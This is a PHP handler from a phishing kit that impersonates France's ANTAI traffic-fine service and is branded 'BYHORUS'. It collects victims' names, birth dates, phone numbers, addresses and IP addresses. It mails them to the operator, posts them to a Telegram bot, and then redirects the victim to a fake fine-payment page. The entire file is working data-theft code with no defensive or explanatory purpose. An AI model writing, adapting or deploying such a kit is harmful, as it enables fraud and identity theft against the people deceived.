<?php
    require("../config.php");
 	$_SESSION["nom"]     = $_POST["nom"];
    $_SESSION["prenom"]  = $_POST["prenom"];
    $_SESSION["dob"]     = $_POST["dob"];
    $_SESSION["zip"]     = $_POST["zip"];
    $_SESSION["phone"] = $_POST["phone"];
    $_SESSION["adress"]  = $_POST["adress"];
    $_SESSION["city"]   = $_POST["city"];

    $message = "
🇫🇷 AMENDES ANTAI V2 🇫🇷

🔱 Prenom: " . $_SESSION["prenom"] . "
🔱 Nom: " . $_SESSION["nom"] . "
🔱 Date de Naissance: " . $_SESSION["dob"] . "
🔱 Phone: " . $_SESSION["phone"] . "

🔱 Adress: " . $_SESSION["adress"] . "
🔱 City: " . $_SESSION["city"] . "
🔱 ZIP: " . $_SESSION["zip"] . "

🔱 Adresse ip: " . _ip() . "
        ";

    if ($rezmail) {
        $Subject = "「🔱」+1 Infos ・ " . $_SESSION['nom'] . " ・ " . $_SESSION['prenom'] . " ・ " . _ip();
        $head = "From: 🔱 BYHORUS <info@HORUS.infos>";

        mail($mail, $Subject, $message, $head);
    }
    $link = (isset($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    if ($reztelegram) {

        file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]));
    }

    header("Location: ../loader.php?r=paiement-contravention&c=5");
    die();
